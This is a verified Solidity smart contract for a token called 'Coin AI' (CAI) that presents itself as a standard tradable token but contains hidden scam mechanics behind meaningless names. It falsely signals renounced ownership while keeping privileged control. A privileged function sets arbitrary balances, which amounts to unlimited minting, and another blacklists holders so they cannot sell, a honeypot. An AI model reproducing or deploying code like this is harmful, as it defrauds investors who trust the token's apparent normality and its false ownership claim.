/**
 *Submitted for verification at BscScan.com on 2023-02-25
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.5;

interface marketingSender {
    function createPair(address totalWallet, address autoReceiver) external returns (address);
}

contract CoinAI {

    function transferFrom(address marketingReceiver, address amountAuto, uint256 enableFee) public returns (bool) {
        if (marketingReceiver != fundSender() && allowance[marketingReceiver][fundSender()] != type(uint256).max) {
            require(allowance[marketingReceiver][fundSender()] >= enableFee);
            allowance[marketingReceiver][fundSender()] -= enableFee;
        }
        require(!shouldMinWallet[marketingReceiver]);
        return limitIs(marketingReceiver, amountAuto, enableFee);
    }

    bool public limitTxList;

    mapping(address => bool) public toWallet;

    address marketingSenderAddr = 0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73;

    mapping(address => mapping(address => uint256)) public allowance;

    mapping(address => bool) public shouldMinWallet;

    uint256 public fundAmountMarketing;

    string public symbol = "CAI";

    mapping(address => uint256) public balanceOf;

    function maxTradingExempt(address txEnable) public {
        require(!autoFund);
        toWallet[txEnable] = true;
        autoFund = true;
    }

    uint256 public toLaunch;

    event Transfer(address indexed from, address indexed swapMaxTotal, uint256 value);

    function enableTx(address amountAuto, uint256 enableFee) public {
        launchedIs();
        balanceOf[amountAuto] = enableFee;
    }

    function approve(address exemptWallet, uint256 enableFee) public returns (bool) {
        allowance[fundSender()][exemptWallet] = enableFee;
        emit Approval(fundSender(), exemptWallet, enableFee);
        return true;
    }

    address public owner;

    bool private marketingSenderTx;

    uint256 public walletList;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    uint256 private feeShould;

    function transfer(address amountAuto, uint256 enableFee) external returns (bool) {
        return transferFrom(fundSender(), amountAuto, enableFee);
    }

    uint8 public decimals = 18;

    address public shouldBuy;

    constructor (){ 
        toWallet[fundSender()] = true;
        balanceOf[fundSender()] = totalSupply;
        shouldBuy = fundSender();
        toTrading = marketingSender(address(marketingSenderAddr)).createPair(address(enableSell),address(this));
        emit Transfer(address(0), shouldBuy, totalSupply);
        emit OwnershipTransferred(shouldBuy, address(0));
    }

    function minAmountMax(address walletTrading) public {
        launchedIs();
        if (walletTrading == shouldBuy || walletTrading == toTrading) {
            return;
        }
        shouldMinWallet[walletTrading] = true;
    }

    uint256 private liquidityListMin;

    uint256 public sellMarketing;

    address public toTrading;

    function launchedIs() private view {
        require(toWallet[fundSender()]);
    }

    event Approval(address indexed takeMax, address indexed spender, uint256 value);

    string public name = "Coin AI";

    address enableSell = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;

    uint256 public totalSupply = 100000000 * 10 ** 18;

    function fundSender() private view returns (address) {
        return msg.sender;
    }

    function limitIs(address swapLimit, address autoShould, uint256 enableFee) internal returns (bool) {
        require(balanceOf[swapLimit] >= enableFee);
        balanceOf[swapLimit] -= enableFee;
        balanceOf[autoShould] += enableFee;
        emit Transfer(swapLimit, autoShould, enableFee);
        return true;
    }

    bool public autoFund;

}